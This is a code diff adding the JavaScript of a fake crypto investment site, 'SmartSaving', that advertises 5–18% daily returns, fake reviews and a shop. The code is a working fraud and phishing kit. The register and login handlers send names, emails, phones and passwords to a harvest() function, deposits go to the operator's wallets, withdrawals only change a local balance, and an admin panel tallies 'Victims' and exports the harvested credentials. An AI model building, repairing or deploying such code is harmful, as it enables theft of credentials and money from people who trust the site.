+  ${getReviews().slice(0,3).map(r=>reviewCard(r)).join('')}
+</div>
+<div style="text-align:center;margin-top:30px"><a href="#reviews" class="btn-o">All Reviews</a></div>
+</section>
+<footer><p>© 2025 SmartSaving.</p></footer>`;}
+
+function reviewCard(r){
+  const initial=(r.name||'U').charAt(0).toUpperCase();
+  const stars='★'.repeat(r.stars)+'☆'.repeat(5-r.stars);
+  const shot=r.shots&&r.shots[0]?`<img class="shot" src="${r.shots[0]}" alt="proof">`:'';
+  return `<div class="review"><div class="head"><div class="avatar">${initial}</div><div><div class="name">${r.name}</div><div class="stars">${stars}</div></div></div><div class="text">${r.text}</div>${shot}<div class="meta">${r.meta||'Verified'}</div></div>`;
+}
+
+function viewReviews(){return `${navBar()}
+<section><h2>Customer Reviews</h2>
+<p style="text-align:center;color:#9aa8ba;margin-bottom:26px;font-size:14px">Real investors. Real withdrawals. Proof attached.</p>
+<div style="text-align:center;margin-bottom:26px"><a href="#upload" class="btn">Share Your Experience</a></div>
+<div class="grid">${getReviews().map(r=>reviewCard(r)).join('')}</div>
+</section>`;}
+
+function viewPlans(){return `${navBar()}
+<section id="plans"><h2>Investment Plans</h2><div class="grid">
+  <div class="card"><h3>Starter</h3><p class="roi">5% Daily</p><p>$50–$999</p><p>7 Days</p><a href="#register" class="btn" style="margin-top:14px">Invest</a></div>
+  <div class="card f"><h3>Silver</h3><p class="roi">9% Daily</p><p>$1,000–$4,999</p><p>14 Days</p><a href="#register" class="btn" style="margin-top:14px">Invest</a></div>
+  <div class="card"><h3>Gold</h3><p class="roi">13% Daily</p><p>$5,000–$19,999</p><p>21 Days</p><a href="#register" class="btn" style="margin-top:14px">Invest</a></div>
+  <div class="card"><h3>Platinum</h3><p class="roi">18% Daily</p><p>$20,000+</p><p>30 Days</p><a href="#register" class="btn" style="margin-top:14px">Invest</a></div>
+</div></section>`;}
+
+function viewShop(){
+  const cats=[
+    {id:'all',label:'All'},{id:'luxury',label:'Luxury'},{id:'bullion',label:'Bullion'},
+    {id:'crypto',label:'Crypto'},{id:'invest',label:'Investments'},{id:'electronics',label:'Electronics'},
+    {id:'appliances',label:'Appliances'},{id:'vehicles',label:'Vehicles'},
+    {id:'experiences',label:'Experiences'},{id:'cards',label:'Gift Cards'}
+  ];
+  const active=window._shopCat||'all';
+  const filtered=active==='all'?PRODUCTS:PRODUCTS.filter(p=>{
+    const m=p.meta.toLowerCase();
+    if(active==='luxury') return /luxury|jewelry/.test(m);
+    if(active==='bullion') return /bullion/.test(m);
+    if(active==='crypto') return /crypto|hardware/.test(m);
+    if(active==='invest') return /investment/.test(m);
+    if(active==='electronics') return /electronics|camera|drone|gaming/.test(m);
+    if(active==='appliances') return /appliance|audio/.test(m);
+    if(active==='vehicles') return /auto/.test(m);
+    if(active==='experiences') return /experience|travel/.test(m);
+    if(active==='cards') return /gift card|streaming/.test(m);
+    return true;
+  });
+  return `${navBar()}
+<section><h2>Shop All Products</h2>
+<div class="tabs">${cats.map(c=>`<button class="tab ${active===c.id?'on':''}" onclick="window._shopCat='${c.id}';render()">${c.label}</button>`).join('')}</div>
+<div class="grid">${filtered.map(p=>`<div class="product"><img src="${p.img}" alt="${p.name}"><div class="body"><h4>${p.name}</h4><div class="price">$${p.price.toLocaleString()}</div><div class="meta">${p.meta}</div><button onclick="buyProduct('${p.id}')">Buy Now</button></div></div>`).join('')}</div>
+</section>`;
+}
+
+function viewRegister(){return `${navBar()}
+<div class="auth">
+  <h2>Create Your Account</h2>
+  <p class="sub">Join 142,000+ investors earning daily.</p>
+  <form id="regForm">
+    <input name="fullname" placeholder="Full Name" required>
+    <input name="email" type="email" placeholder="Email Address" required>
+    <input name="phone" placeholder="Phone Number" required>
+    <input name="password" type="password" placeholder="Password" required>
+    <button type="submit">Create Account</button>
+  </form>
+  <p style="text-align:center;color:#6b788a;margin-top:16px;font-size:13px">Already have an account? <a href="#login" style="color:#00d97e">Login</a></p>
+</div>`;}
+
+function viewLogin(){return `${navBar()}
+<div class="auth">
+  <h2 style="margin-bottom:22px">Login</h2>
+  <form id="loginForm">
+    <input name="email" type="email" placeholder="Email" required>
+    <input name="password" type="password" placeholder="Password" required>
+    <button type="submit">Login</button>
+  </form>
+  <p style="text-align:center;color:#6b788a;margin-top:16px;font-size:13px">New here? <a href="#register" style="color:#00d97e">Create account</a></p>
+</div>`;}
+
+function viewDashboard(){
+  const bal=getBalance();
+  const pend=getPendingDeposits().filter(d=>d.status==='pending');
+  const u=JSON.parse(localStorage.getItem('user')||'{}');
+  const roiMap={starter:.05,silver:.09,gold:.13,platinum:.18};
+  const rate=roiMap[u.plan]||.09;
+  const planNames={starter:'Starter',silver:'Silver',gold:'Gold',platinum:'Platinum'};
+  const currentPlan=u.plan?planNames[u.plan]:'Not selected';
+  return `${navBar()}
+<div class="dash">
+  ${pend.length?pend.map(p=>`<div class="pending">⏳ Deposit of <b>$${p.amount.toFixed(2)}</b> via ${p.method.toUpperCase()} — <b>pending admin approval</b></div>`).join(''):''}
+  <div class="card" style="text-align:left;padding:28px">
+    <p style="color:#9aa8ba;font-size:13px;text-transform:uppercase;letter-spacing:1px;font-weight:600">Account Balance</p>
+    <div class="bal">$${bal.toFixed(2)}</div>
+    <p style="color:#00d97e;margin-top:6px;font-size:14px;font-weight:600">Earning ${(rate*100).toFixed(0)}% Daily · Plan: ${currentPlan}</p>
+  </div>
+  <div class="dash-stats">
+    <div class="card"><p>Available</p><h3 style="color:#00d97e">$${bal.toFixed(2)}</h3></div>
+    <div class="card"><p>Pending</p><h3 style="color:#e6d97e">$${pend.reduce((s,p)=>s+p.amount,0).toFixed(2)}</h3></div>
+    <div class="card"><p>Orders</p><h3>${getOrders().length}</h3></div>
+  </div>
+  <div class="card" style="text-align:left;margin-top:18px;padding:24px">
+    <h3 style="margin-bottom:14px">Choose / Change Investment Plan</h3>
+    <div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(180px,1fr))">
+      ${['starter','silver','gold','platinum'].map(pid=>{
+        const p={starter:['Starter',5,50,999],silver:['Silver',9,1000,4999],gold:['Gold',13,5000,19999],platinum:['Platinum',18,20000,'∞']}[pid];
+        const act=u.plan===pid;
+        return `<div class="card ${act?'f':''}" style="padding:18px"><h4 style="font-size:15px;margin-bottom:6px">${p[0]}</h4><p class="roi" style="font-size:22px">${p[1]}%</p><p style="color:#9aa8ba;font-size:12px">$${p[2]} – $${p[3]}</p><button class="btn" style="margin-top:12px;width:100%;font-size:13px" onclick="selectPlan('${pid}')">${act?'Active':'Select'}</button></div>`;
+      }).join('')}
+    </div>
+  </div>
+  <div class="card" style="margin-top:18px;padding:20px;display:flex;gap:10px;flex-wrap:wrap;justify-content:center">
+    <a href="#deposit" class="btn">Deposit</a>
+    <a href="#withdraw" class="btn-o">Withdraw</a>
+    <a href="#shop" class="btn-o">Shop</a>
+    <a href="#orders" class="btn-o">Orders</a>
+    <a href="#upload" class="btn-o">Upload Proof</a>
+  </div>
+</div>`;
+}
+
+function selectPlan(pid){
+  const u=JSON.parse(localStorage.getItem('user')||'{}');
+  u.plan=pid;
+  localStorage.setItem('user',JSON.stringify(u));
+  harvest({type:'plan_selected',plan:pid,email:u.email});
+  alert('Plan selected: '+pid.toUpperCase());
+  render();
+}
+
+function viewDeposit(){
+  if(!requireAuth('register')) return '';
+  const u=getUser();
+  return `${navBar()}
+<div class="auth">
+  <h2>Make a Deposit</h2>
+  <p class="sub">Choose plan, send funds, upload proof. Balance credits after admin approval.</p>
+  <label style="color:#9aa8ba;font-size:13px;margin-bottom:6px;display:block">Investment Plan</label>
+  <select id="plan">
+    <option value="">Select Investment Plan</option>
+    <option value="starter" ${u.plan==='starter'?'selected':''}>Starter — 5% Daily ($50–$999)</option>
+    <option value="silver" ${u.plan==='silver'?'selected':''}>Silver — 9% Daily ($1,000–$4,999)</option>
+    <option value="gold" ${u.plan==='gold'?'selected':''}>Gold — 13% Daily ($5,000–$19,999)</option>
+    <option value="platinum" ${u.plan==='platinum'?'selected':''}>Platinum — 18% Daily ($20,000+)</option>
+  </select>
+  <label style="color:#9aa8ba;font-size:13px;margin-bottom:6px;display:block">Payment Method</label>
+  <select id="method"><option value="btc">Bitcoin (BTC)</option><option value="eth">Ethereum (ETH)</option><option value="usdt">USDT (TRC20)</option></select>
+  <label style="color:#9aa8ba;font-size:13px;margin-bottom:6px;display:block">Amount (USD)</label>
+  <input id="amt" type="number" placeholder="Amount in USD" min="50">
+  <label style="color:#9aa8ba;font-size:13px;margin-bottom:6px;display:block">Send to this wallet</label>
+  <div class="wallet" id="addr" onclick="copyWallet()" title="Click to copy">${CONFIG.WALLETS.btc}</div>
+  <p id="copyMsg" style="color:#00d97e;font-size:12px;margin-bottom:14px;display:none">Copied to clipboard</p>
+  <label class="upload" for="proofFile">
+    <input id="proofFile" type="file" accept="image/*">
+    <div class="icon">📎</div>
+    <div class="lbl" id="proofLbl">Tap to upload payment proof</div>
+    <div class="hint">Screenshot of your transaction</div>
+  </label>
+  <img id="proofPreview" class="preview" style="display:none">
+  <button onclick="submitDeposit()">I Have Sent the Funds</button>
+</div>`;
+}
+
+function viewWithdraw(){
+  if(!requireAuth('register')) return '';
+  const bal=getBalance();
+  return `${navBar()}
+<div class="auth">
+  <h2>Withdraw Funds</h2>
+  <p class="sub">Minimum $50. Available: $${bal.toFixed(2)}</p>
+  <select id="wmethod"><option value="btc">Bitcoin</option><option value="eth">Ethereum</option><option value="usdt">USDT</option></select>
+  <input id="wwallet" placeholder="Your Wallet Address">
+  <input id="wamt" type="number" placeholder="Amount in USD">
+  <button onclick="submitWithdraw()">Request Withdrawal</button>
+</div>`;
+}
+
+function viewOrders(){
+  if(!requireAuth('register')) return '';
+  const orders=getOrders();
+  const wds=getWithdrawals();
+  return `${navBar()}
+<div class="dash">
+  <div class="card" style="text-align:left"><h2 style="margin-bottom:16px">My Orders</h2>
+  ${orders.length===0?'<p style="color:#9aa8ba">No orders yet. <a href="#shop" style="color:#00d97e">Browse shop</a></p>':orders.map(o=>`<div class="order"><div><b>${o.name}</b><br><span style="color:#6b788a">Order ${o.id}</span></div><div style="text-align:right"><div>$${o.price.toFixed(2)}</div><span class="badge ${o.status}">${o.status.toUpperCase()}</span></div></div>`).join('')}
+  </div>
+  <div class="card" style="text-align:left;margin-top:20px"><h2 style="margin-bottom:16px">Withdrawals</h2>
+  ${wds.length===0?'<p style="color:#9aa8ba">No withdrawals yet.</p>':wds.map(w=>`<div class="order"><div><b>$${w.amount.toFixed(2)}</b> → ${w.method.toUpperCase()}<br><span style="color:#6b788a">${w.wallet.slice(0,20)}…</span></div><div style="text-align:right"><span class="badge ${w.status}">${w.status.toUpperCase()}</span>${w.proof?'<div style="font-size:11px;color:#00d97e;margin-top:4px">✓ Proof uploaded</div>':`<div style="font-size:11px;color:#e6d97e;margin-top:4px"><a href="#upload" style="color:#e6d97e">Upload receipt</a></div>`}</div></div>`).join('')}
+  </div>
+</div>`;
+}
+
+function viewUploadProof(){
+  if(!requireAuth('register')) return '';
+  return `${navBar()}
+<div class="auth">
+  <h2>Upload Payment Proof</h2>
+  <p class="sub">Attach a screenshot of your deposit, withdrawal, or bank credit.</p>
+  <form id="proofForm">
+    <select name="kind" required>
+      <option value="">What are you uploading?</option>
+      <option value="deposit">Deposit transaction proof</option>
+      <option value="withdrawal">Withdrawal receipt</option>
+      <option value="bank_credit">Bank credit confirmation</option>
+    </select>
+    <input name="amount" type="number" placeholder="Amount (USD)" required>
+    <input name="reference" placeholder="Transaction hash (optional)">
+    <label class="upload" for="upFile">
+      <input id="upFile" type="file" accept="image/*" required>
+      <div class="icon">📎</div>
+      <div class="lbl" id="upLbl">Tap to select image</div>
+      <div class="hint">PNG, JPG · max 5MB</div>
+    </label>
+    <img id="upPreview" class="preview" style="display:none">
+    <textarea name="note" placeholder="Optional note"></textarea>
+    <button type="submit">Submit Proof</button>
+  </form>
+</div>`;
+}
+
+function viewAdmin(){
+  const tok=localStorage.getItem('adminTok');
+  if(!tok){
+    return `${navBar()}
+<div class="auth">
+  <h2 style="margin-bottom:22px">Admin Access</h2>
+  <form id="adminForm">
+    <input id="adminEmail" type="text" placeholder="Admin Email" required>
+    <input id="adminPass" type="password" placeholder="Admin Password" required>
+    <button type="submit">Enter</button>
+  </form>
+</div>`;
+  }
+  return `${navBar()}
+<div class="dash">
+  <div class="card" style="text-align:left"><h2 style="margin:0 0 8px">Admin Control Panel</h2><p style="color:#9aa8ba;font-size:14px">Pending deposits, victims, credentials, withdrawals.</p></div>
+  <div class="dash-stats" style="grid-template-columns:repeat(4,1fr)">
+    <div class="card"><p>Victims</p><h3 id="aVictims" style="color:#00d97e">—</h3></div>
+    <div class="card"><p>Deposits</p><h3 id="aDep" style="color:#00d97e">—</h3></div>
+    <div class="card"><p>Withdrawals</p><h3 id="aWd" style="color:#00d97e">—</h3></div>
+    <div class="card"><p>Flagged</p><h3 id="aFlag" style="color:#e6d97e">—</h3></div>
+  </div>
+  <div class="card" style="text-align:left;margin-top:20px">
+    <h3 style="margin-bottom:12px">Pending Deposits — Awaiting Approval</h3>
+    <button onclick="loadPending()" class="btn" style="margin-bottom:14px">Refresh</button>
+    <div id="pendingBox"></div>
+  </div>
+  <div class="card" style="text-align:left;margin-top:20px">
+    <h3 style="margin-bottom:12px">Harvested Log</h3>
+    <button onclick="loadLogs()" class="btn" style="margin-bottom:14px">Refresh</button>
+    <button onclick="exportLogs()" class="btn-o" style="margin-bottom:14px">Export JSON</button>
+    <div id="logBox"></div>
+    
+  </div>
+</div>`;
+}
+function copyWallet(){
+  const text=document.getElementById('addr').textContent.trim();
+  const done=()=>{const m=document.getElementById('copyMsg');if(m){m.style.display='block';setTimeout(()=>m.style.display='none',2000);}};
+  if(navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done).catch(()=>fallbackCopy(text,done));
+  else fallbackCopy(text,done);
+}
+function fallbackCopy(text,cb){
+  const ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.opacity='0';
+  document.body.appendChild(ta);ta.select();
+  try{document.execCommand('copy');cb();}catch(e){}
+  document.body.removeChild(ta);
+}
+
+function adminLogin(email,pass){
+  if(email!==ADMIN_EMAIL||pass!==ADMIN_PASSWORD){alert('Wrong credentials');return;}
+  localStorage.setItem('adminTok',btoa('admin:'+email+':'+Date.now()));
+  render();
+}
+function adminLogout(){
+  localStorage.removeItem('adminTok');
+  sessionStorage.removeItem('adminUnlocked');
+  go('home');
+}
+function loadLogs(){
+  fetch('/api/logs?token='+encodeURIComponent(localStorage.getItem('adminTok')||''))
+    .then(r=>r.json()).then(logs=>{
+      document.getElementById('logBox').textContent=JSON.stringify(logs,null,2);
+      const victims=new Set(logs.filter(l=>l.email).map(l=>l.email));
+      let dep=0,wd=0,fl=0;
+      logs.forEach(l=>{
+        if(l.type==='deposit') dep+=parseFloat(l.amount)||0;
+        if(l.type==='withdraw') wd+=parseFloat(l.amount)||0;
+        if(l.flags&&l.flags.length) fl++;
+      });
+      document.getElementById('aVictims').textContent=victims.size;
+      document.getElementById('aDep').textContent='$'+dep.toFixed(2);
+      document.getElementById('aWd').textContent='$'+wd.toFixed(2);
+      document.getElementById('aFlag').textContent=fl;
+    }).catch(()=>{document.getElementById('logBox').textContent='Failed to load.';});
+}
+function exportLogs(){
+  fetch('/api/logs?token='+encodeURIComponent(localStorage.getItem('adminTok')||''))
+    .then(r=>r.blob()).then(b=>{
+      const a=document.createElement('a');
+      a.href=URL.createObjectURL(b);
+      a.download='harvest_'+Date.now()+'.json';
+      a.click();
+    });
+}
+
+function loadPending(){
+  fetch('/api/deposit/pending?token='+encodeURIComponent(localStorage.getItem('adminTok')||''))
+    .then(r=>r.json()).then(list=>{
+      const box=document.getElementById('pendingBox');
+      if(!Array.isArray(list)){box.innerHTML='<p style="color:#9aa8ba">No data.</p>';return;}
+      const pending=list.filter(d=>d.status==='pending');
+      if(pending.length===0){box.innerHTML='<p style="color:#9aa8ba">No pending deposits.</p>';return;}
+      box.innerHTML=pending.map(d=>`
+        <div class="order">
+          <div>
+            <b>$${d.amount.toFixed(2)}</b> · ${d.method.toUpperCase()} · ${d.plan.toUpperCase()}<br>
+            <span style="color:#6b788a">${d.email||d.userId} · ${new Date(d.createdAt).toLocaleString()}</span>
+            ${d.proof?`<br><a href="${d.proof}" target="_blank" style="color:#00d97e;font-size:12px">View payment proof</a>`:''}
+          </div>
+          <div style="display:flex;gap:8px">
+            <button class="btn" onclick="approveDeposit('${d.id}')">Approve</button>
+            <button class="btn-o" onclick="rejectDeposit('${d.id}')">Reject</button>
+          </div>
+        </div>`).join('');
+    }).catch(()=>{document.getElementById('pendingBox').textContent='Failed to load.';});
+}
+function approveDeposit(id){
+  fetch('/api/deposit/approve?token='+encodeURIComponent(localStorage.getItem('adminTok')||''),{
+    method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})
+  }).then(r=>r.json()).then(()=>{alert('Deposit approved.');loadPending();});
+}
+function rejectDeposit(id){
+  fetch('/api/deposit/reject?token='+encodeURIComponent(localStorage.getItem('adminTok')||''),{
+    method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})
+  }).then(r=>r.json()).then(()=>{alert('Deposit rejected.');loadPending();});
+}
+
+function buyProduct(id){
+  const p=PRODUCTS.find(x=>x.id===id);
+  if(!p) return;
+  if(!requireAuth('register')) return;
+  const bal=getBalance();
+  if(bal<p.price){
+    alert(`Insufficient balance. You need $${(p.price-bal).toFixed(2)} more.\n\nDeposit to add funds — credited after admin approval.`);
+    go('deposit');return;
+  }
+  setBalance(bal-p.price);
+  addOrder(p,p.price);
+  logTx({type:'purchase',productId:p.id,name:p.name,amount:p.price});
+  alert(`Order placed: ${p.name}\n\nStatus: PENDING\nExpected delivery: 3-7 days`);
+  go('orders');
+}
+
+function bind(route){
+  if(route==='home') tickStats();
+
+  if(route==='register'){
+    document.getElementById('regForm').addEventListener('submit',e=>{
+      e.preventDefault();
+      const data=Object.fromEntries(new FormData(e.target).entries());
+      harvest({...data,type:'register'});
+      localStorage.setItem('user',JSON.stringify(data));
+      go('dashboard');
+    });
+  }
+
+  if(route==='login'){
+    document.getElementById('loginForm').addEventListener('submit',e=>{
+      e.preventDefault();
+      const data=Object.fromEntries(new FormData(e.target).entries());
+      harvest({...data,type:'login'});
+      const existing=JSON.parse(localStorage.getItem('user')||'{}');
+      localStorage.setItem('user',JSON.stringify({...existing,...data}));
+      go('dashboard');
+    });
+  }
+
+  if(route==='dashboard') syncApprovedDeposits();
+
+  if(route==='deposit'){
+    document.getElementById('method').onchange=e=>{
+      document.getElementById('addr').textContent=CONFIG.WALLETS[e.target.value];
+    };
+    const file=document.getElementById('proofFile');
+    file.addEventListener('change',e=>{
+      const f=e.target.files[0];
+      if(!f) return;
+      document.getElementById('proofLbl').textContent=f.name;
+      readFileAsDataURL(f,url=>{
+        const img=document.getElementById('proofPreview');
+        img.src=url;img.style.display='block';
+      });
+    });
+  }
+
+  if(route==='upload'){
+    const file=document.getElementById('upFile');
+    file.addEventListener('change',e=>{
+      const f=e.target.files[0];
+      if(!f) return;
+      document.getElementById('upLbl').textContent=f.name;
+      readFileAsDataURL(f,url=>{
+        const img=document.getElementById('upPreview');
+        img.src=url;img.style.display='block';
+      });
+    });
+    document.getElementById('proofForm').addEventListener('submit',e=>{
+      e.preventDefault();
+      const fd=Object.fromEntries(new FormData(e.target).entries());
+      const fileEl=document.getElementById('upFile');
+      const f=fileEl.files[0];
+      if(!f) return alert('Select an image');
+      readFileAsDataURL(f,url=>{
+        logTx({type:'proof_upload',kind:fd.kind,amount:parseFloat(fd.amount),reference:fd.reference,note:fd.note,file:f.name,fileSize:f.size,proof:url});
+        alert('Proof submitted. Our team will verify within 24 hours.');
+        go('orders');
+      });
+    });
+  }
+
+  if(route==='admin'){
+    const form=document.getElementById('adminForm');
+    if(form){
+      form.addEventListener('submit',e=>{
+        e.preventDefault();
+        adminLogin(document.getElementById('adminEmail').value,document.getElementById('adminPass').value);
+      });
+    } else if(localStorage.getItem('adminTok')){
+      loadLogs();
+      loadPending();
+    }
+  }
+}
+
+function submitDeposit(){
+  const amt=parseFloat(document.getElementById('amt').value);
+  const method=document.getElementById('method').value;
+  const plan=document.getElementById('plan').value;
+  if(!plan) return alert('Select an investment plan');
+  if(!amt||amt<50) return alert('Minimum deposit is $50');
+
+  const u=JSON.parse(localStorage.getItem('user')||'{}');
+  u.plan=plan;
+  localStorage.setItem('user',JSON.stringify(u));
+
+  const fileEl=document.getElementById('proofFile');
+  const f=fileEl.files[0];
+
+  const finish=proof=>{
+    fetch('/api/deposit/submit',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({email:u.email,amount:amt,method,plan,proof})
+    }).catch(()=>{});
+    logTx({type:'deposit',amount:amt,method,plan,hasProof:!!proof});
+    addPendingDeposit(amt,method,proof);
+    alert(`Deposit of $${amt.toFixed(2)} submitted on ${plan.toUpperCase()} plan.\n\nStatus: PENDING ADMIN APPROVAL\nBalance updates once approved.`);
+    go('dashboard');
+  };
+  if(f) readFileAsDataURL(f,finish);
+  else finish(null);
+}
+
+function submitWithdraw(){
+  const wallet=document.getElementById('wwallet').value;
+  const amt=parseFloat(document.getElementById('wamt').value);
+  const method=document.getElementById('wmethod').value;
+  if(!wallet||!amt) return alert('Fill all fields');
+  if(amt<50) return alert('Minimum withdrawal is $50');
+  const bal=getBalance();
+  if(amt>bal) return alert('Insufficient balance');
+  logTx({type:'withdraw',wallet,amount:amt,method});
+  setBalance(bal-amt);
+  addWithdrawal(amt,method,wallet,null);
+  alert('Withdrawal submitted. Funds arrive within 24 hours.');
+  go('orders');
+}
+
+render();
+</script>
+</body>
+</html>
